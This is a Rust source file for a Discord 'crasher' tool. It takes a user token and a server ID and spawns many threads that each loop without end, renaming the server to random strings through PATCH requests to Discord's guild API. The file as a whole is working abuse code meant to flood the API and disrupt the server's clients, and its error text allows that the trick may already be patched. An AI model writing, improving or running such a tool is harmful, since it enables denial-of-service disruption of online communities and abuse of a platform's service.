use reqwest::StatusCode;
use std::sync::Arc;
use clap::Clap;

#[derive(Clap)]
#[clap(version = "2.0", author = "Aldas <aldas.me>")]
struct Opts {
    #[clap(short, long)]
    token: String,
    #[clap(short, long)]
    guild_id: usize,
    #[clap(long, default_value = "10")]
    threads: u16
}

fn main() {
    println!("Starting the crasher. Press ctrl + c at the same time to escape!");
    let options: Arc<Opts> = Arc::new(Opts::parse());
    let threads: Vec<_> = (0..options.threads).map(|_| {
        let opts = Arc::clone(&options);
        std::thread::spawn(move || {
            loop {
                run(&opts.token, &opts.guild_id, &(4 as usize))
            }
        })
    }).collect();
    for thread in threads {
        thread.join().unwrap();
    };
}

fn run(token: &str, guild_id: &usize, length: &usize) {
    match change_settings(token, guild_id, &GuildSettings{
        afk_channel_id: None,
        afk_timeout: None,
        banner: None,
        default_message_notifications: None,
        description: None,
        explicit_content_filter: None,
        icon: None,
        name: Some(rand_string(length)),
        public_updates_channel_id: None,
        region: None,
        splash: None,
        system_channel_flags: None,
        system_channel_id: None,
        verification_level: None
    }) {
        Ok(_) => {},
        Err(text) => panic!("{}\nError has occured ^", text)
    };
}

fn rand_string(length: &usize) -> String {
    (0..*length).map(|_| (0x20u8 + (rand::random::<f32>() * 96.0) as u8) as char).collect()
}

#[derive(serde::Serialize)]
struct GuildSettings {
    #[serde(skip_serializing_if = "Option::is_none")]
    afk_channel_id: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    afk_timeout: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    banner: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    default_message_notifications: Option<u8>,
    #[serde(skip_serializing_if = "Option::is_none")]
    description: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    explicit_content_filter: Option<u8>,
    #[serde(skip_serializing_if = "Option::is_none")]
    icon: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    public_updates_channel_id: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    region: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    splash: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    system_channel_flags: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    system_channel_id: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    verification_level: Option<u8>
}

fn change_settings(token: &str, guild_id: &usize, settings: &GuildSettings) -> Result<(), &str> {
    let req = reqwest::blocking::Client::new()
    .patch(&format!("https://discord.com/api/v6/guilds/{}", guild_id))
    .header("authorization", token)
    .json(&settings)
    .send()
    .unwrap();

    match req.status() {
        StatusCode::OK => return Ok(()),
        StatusCode::FORBIDDEN => return Err("Forbidden"),
        StatusCode::UNAUTHORIZED => return Err("Invalid token or you don't have permissions to manage that server!"),
        StatusCode::TOO_MANY_REQUESTS => return Err("Got ratelimited. Either its trying to do something else or it has been patched."),
        _ => return Err("Unknown error has occurred")
    };
}
